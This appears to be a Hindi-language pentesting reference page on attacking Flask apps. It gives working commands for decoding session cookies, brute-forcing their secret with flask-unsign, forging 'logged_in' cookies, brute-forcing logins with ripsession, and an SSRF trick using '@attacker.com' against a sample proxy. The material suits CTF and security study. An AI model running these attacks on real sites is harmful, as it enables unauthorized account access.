# Flask

{{#include ../../banners/hacktricks-training.md}}

**संभवतः यदि आप एक CTF खेल रहे हैं तो एक Flask एप्लिकेशन** [**SSTI**](../../pentesting-web/ssti-server-side-template-injection/index.html)** से संबंधित होगा।**

## Cookies

डिफ़ॉल्ट कुकी सत्र का नाम **`session`** है।

### Decoder

ऑनलाइन Flask कुकी डिकोडर: [https://www.kirsle.net/wizards/flask-session.cgi](https://www.kirsle.net/wizards/flask-session.cgi)

#### Manual

कुकी के पहले भाग को पहले बिंदु तक प्राप्त करें और इसे Base64 डिकोड करें>
```bash
echo "ImhlbGxvIg" | base64 -d
```
कुकी को एक पासवर्ड का उपयोग करके भी साइन किया गया है

### **Flask-Unsign**

कमांड लाइन टूल जो एक Flask एप्लिकेशन के सत्र कुकीज़ को प्राप्त करने, डिकोड करने, ब्रूट-फोर्स करने और बनाने के लिए गुप्त कुंजी का अनुमान लगाकर उपयोग किया जाता है।

{{#ref}}
https://pypi.org/project/flask-unsign/
{{#endref}}
```bash
pip3 install flask-unsign
```
#### **कुकी डिकोड करें**
```bash
flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8'
```
#### **ब्रूट फोर्स**
```bash
flask-unsign --wordlist /usr/share/wordlists/rockyou.txt --unsign --cookie '<cookie>' --no-literal-eval
```
#### **साइनिंग**
```bash
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME'
```
#### पुराने संस्करणों का उपयोग करके साइन करना
```bash
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME' --legacy
```
### **RIPsession**

कमान्ड लाइन टूल जो flask-unsign के साथ बनाए गए कुकीज़ का उपयोग करके वेबसाइटों पर ब्रूट-फोर्स करता है।

{{#ref}}
https://github.com/Tagvi/ripsession
{{#endref}}
```bash
ripsession -u 10.10.11.100 -c "{'logged_in': True, 'username': 'changeMe'}" -s password123 -f "user doesn't exist" -w wordlist.txt
```
### Flask सत्र कुकी में SQLi SQLmap के साथ

[**यह उदाहरण**](../../pentesting-web/sql-injection/sqlmap/index.html#eval) sqlmap `eval` विकल्प का उपयोग करता है ताकि **फ्लास्क के लिए sqlmap पेलोड को स्वचालित रूप से साइन किया जा सके** एक ज्ञात गुप्त कुंजी का उपयोग करके।

## SSRF के लिए Flask प्रॉक्सी

[**इस लेख में**](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies) यह समझाया गया है कि कैसे Flask एक अनुरोध की अनुमति देता है जो चरित्र "@" से शुरू होता है:
```http
GET @/ HTTP/1.1
Host: target.com
Connection: close
```
निम्नलिखित परिदृश्य में:
```python
from flask import Flask
from requests import get

app = Flask('__main__')
SITE_NAME = 'https://google.com/'

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def proxy(path):
return get(f'{SITE_NAME}{path}').content

app.run(host='0.0.0.0', port=8080)
```
कुछ ऐसा "@attacker.com" पेश करने की अनुमति दे सकता है जिससे **SSRF** हो सके। 

{{#include ../../banners/hacktricks-training.md}}
